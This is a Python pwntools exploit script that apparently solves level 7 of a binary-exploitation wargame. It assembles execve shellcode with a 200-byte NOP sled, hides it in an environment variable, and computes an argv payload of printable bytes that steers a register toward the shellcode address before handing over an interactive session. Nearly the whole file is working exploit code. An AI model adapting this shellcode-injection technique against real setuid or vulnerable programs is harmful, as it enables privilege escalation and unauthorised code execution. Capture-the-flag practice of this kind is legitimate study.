#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template 7AAAAAAA
from pwn import *
import math

# Set up pwntools for the correct architecture
# exe = context.binary = ELF(args.EXE or './7AAAAAAA')
exe = context.binary = ELF(args.EXE or '/var/challenge/level7/7')


# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR

l33tpath = '/usr/local/bin/l33t'
shellcode = asm(shellcraft.execve(path=l33tpath, argv=[l33tpath]))
nop_sled = b'\x90' * 200
shellcode = nop_sled + shellcode

payload = fit({
    0: shellcode,
})

# Start with a custom empty env
env = {
    "SHOULD_NOT_SEE": "yes",
    "L33T": "A" * len(shellcode), # when run with GDB, bytes give an error so replace with a string of the same length to reproduce env
}

shellcode_addr = (0x7fffffffeec8 + 50)
shellcode_addr_packed = p64(shellcode_addr)

# this is the offset we need to fill to overwrite r14
start = 0x8000000abcde
offset = start - shellcode_addr

print(f"Offset: {offset}")

# try to fill the offset with the largest ascii printable character (z) which is 0x7a / 122

# we start with the biggest char that we can print (z)

argv1 = b''
remainder = offset - 53 # 53 (char '5') is the last value that should end up in r13
while remainder > 0:
    if remainder > ord('z'):
        needed = math.floor(remainder / ord('z'))
        argv1 += b'z' * needed
        remainder = remainder % ord('z')
    else:
        argv1 += chr(remainder).encode()
        break
    
argv1 += b'5'


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    
    argv = [argv1]
    
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw, env=env)
    else:
        env['L33T'] = shellcode
        return process([exe.path] + argv, *a, **kw, env=env)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Full RELRO
# Stack:      Canary found
# NX:         NX unknown - GNU_STACK missing
# PIE:        PIE enabled
# Stack:      Executable
# RWX:        Has RWX segments
# FORTIFY:    Enabled
# SHSTK:      Enabled
# IBT:        Enabled
# Stripped:   No
# Debuginfo:  Yes

io = start()

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

io.interactive()

